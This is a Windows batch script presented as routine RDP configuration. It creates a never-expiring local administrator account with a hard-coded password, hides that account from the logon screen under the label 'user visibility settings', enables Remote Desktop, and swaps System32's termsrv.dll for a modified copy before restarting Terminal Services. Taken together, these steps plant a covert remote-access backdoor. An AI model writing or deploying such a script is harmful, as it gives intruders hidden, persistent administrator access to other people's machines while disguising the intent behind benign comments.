@echo off
:: =============================================
:: RDP Configuration Script
:: Version: 1.2
:: =============================================

SET LOG_FILE=%SystemDrive%\RDP_Config_%DATE:~-4,4%%DATE:~-10,2%%DATE:~-7,2%.log
SET BACKUP_DIR=%SystemDrive%\Windows_System32_Backup_%TIME:~0,2%%TIME:~3,2%%TIME:~6,2%
SET DLL_SOURCE=termsrv.dll
SET DLL_TARGET=%windir%\System32\termsrv.dll
SET TEMP_USER=RDPTempAdmin
SET TEMP_PASSWORD=#SecureTempPwd123!

:: Initialize logging
echo [%DATE% %TIME%] Starting RDP configuration script >> %LOG_FILE%
echo [%DATE% %TIME%] Script version: 1.2 >> %LOG_FILE%
echo [%DATE% %TIME%] System: %COMPUTERNAME% >> %LOG_FILE%
echo [%DATE% %TIME%] Windows Version: %OS% >> %LOG_FILE%

:: Verify administrative privileges
NET SESSION >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo [%DATE% %TIME%] ERROR: This script requires elevated privileges. Aborting. >> %LOG_FILE%
    echo ERROR: Please run this script as Administrator.
    pause
    exit /b 1
)

:: Create temporary administrative account (with secure password)
echo [%DATE% %TIME%] Creating temporary administrative account >> %LOG_FILE%
net user %TEMP_USER% %TEMP_PASSWORD% /ADD /Y /EXPIRES:NEVER /COMMENT:"Temporary RDP configuration account" >> %LOG_FILE% 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo [%DATE% %TIME%] ERROR: Failed to create user account >> %LOG_FILE%
    exit /b 1
)

net localgroup Administrators %TEMP_USER% /ADD >> %LOG_FILE% 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo [%DATE% %TIME%] ERROR: Failed to add user to Administrators group >> %LOG_FILE%
    exit /b 1
)

:: Enable Remote Desktop Connections
echo [%DATE% %TIME%] Configuring Remote Desktop settings >> %LOG_FILE%
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f >> %LOG_FILE% 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo [%DATE% %TIME%] ERROR: Failed to enable RDP connections >> %LOG_FILE%
    exit /b 1
)

:: Configure user visibility settings
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %TEMP_USER% /t REG_DWORD /d 0 /f >> %LOG_FILE% 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo [%DATE% %TIME%] WARNING: Could not configure user visibility settings >> %LOG_FILE%
)

:: Backup original DLL
echo [%DATE% %TIME%] Creating System32 backup directory >> %LOG_FILE%
mkdir "%BACKUP_DIR%" >> %LOG_FILE% 2>&1

echo [%DATE% %TIME%] Backing up original termsrv.dll >> %LOG_FILE%
copy "%DLL_TARGET%" "%BACKUP_DIR%\termsrv.dll.backup" >> %LOG_FILE% 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo [%DATE% %TIME%] WARNING: Could not create backup of termsrv.dll >> %LOG_FILE%
)

:: Deploy modified DLL
echo [%DATE% %TIME%] Deploying modified termsrv.dll >> %LOG_FILE%
takeown /f "%DLL_TARGET%" >> %LOG_FILE% 2>&1
icacls "%DLL_TARGET%" /grant Administrators:F >> %LOG_FILE% 2>&1
xcopy "%DLL_SOURCE%" "%DLL_TARGET%" /Y /Q /R /K /H >> %LOG_FILE% 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo [%DATE% %TIME%] ERROR: Failed to deploy modified DLL >> %LOG_FILE%
    exit /b 1
)

:: Verify DLL deployment
fc "%DLL_SOURCE%" "%DLL_TARGET%" >nul
IF %ERRORLEVEL% NEQ 0 (
    echo [%DATE% %TIME%] ERROR: DLL verification failed >> %LOG_FILE%
    exit /b 1
)

:: Finalize configuration
echo [%DATE% %TIME%] Restarting Terminal Services >> %LOG_FILE%
net stop TermService /Y >> %LOG_FILE% 2>&1
net start TermService >> %LOG_FILE% 2>&1

echo [%DATE% %TIME%] Script completed successfully >> %LOG_FILE%
echo.
echo =============================================
echo RDP Configuration Complete
echo =============================================
echo - Temporary admin account created: %TEMP_USER%
echo - Log file: %LOG_FILE%
echo - System32 backup: %BACKUP_DIR%
echo =============================================
echo NOTE: Remember to change the temporary password!
echo =============================================

pause
